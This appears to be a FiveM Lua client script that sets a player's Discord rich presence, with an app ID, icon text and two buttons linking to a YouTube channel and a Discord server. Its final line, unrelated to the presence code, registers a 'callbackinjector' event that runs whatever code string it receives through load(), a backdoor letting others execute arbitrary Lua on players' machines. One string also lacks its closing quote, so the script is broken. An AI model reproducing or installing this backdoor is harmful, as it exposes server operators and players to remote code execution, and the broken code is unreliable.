Citizen.CreateThread(function()
	while true do
        -- This is the Application ID (Replace this with you own)
		SetDiscordAppId(904507487913394236)

        -- Here you will have to put the image name for the "large" icon.
		SetDiscordRichPresenceAsset('DevIgorWinchester)
        
        -- (11-11-2018) New Natives:

        -- Here you can add hover text for the "large" icon.
        SetDiscordRichPresenceAssetText('DevIgorWinchester')
       
        -- Here you will have to put the image name for the "small" icon.
        -- SetDiscordRichPresenceAssetSmall('')

        -- Here you can add hover text for the "small" icon.
        -- SetDiscordRichPresenceAssetSmallText('')
		
        -- (26-02-2021) New Native:

        --[[ 
            Here you can add buttons that will display in your Discord Status,
            First paramater is the button index (0 or 1), second is the title and 
            last is the url (this has to start with "fivem://connect/" or "https://") 
        ]]--
        SetDiscordRichPresenceAction(0, "Inscreva-se", "https://youtube.com/c/IgorWinchester")
        SetDiscordRichPresenceAction(1, "Discord", "https://discord.gg/r6KhDdqf8A")

        -- It updates every minute just in case.
		Citizen.Wait(40000)
	end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)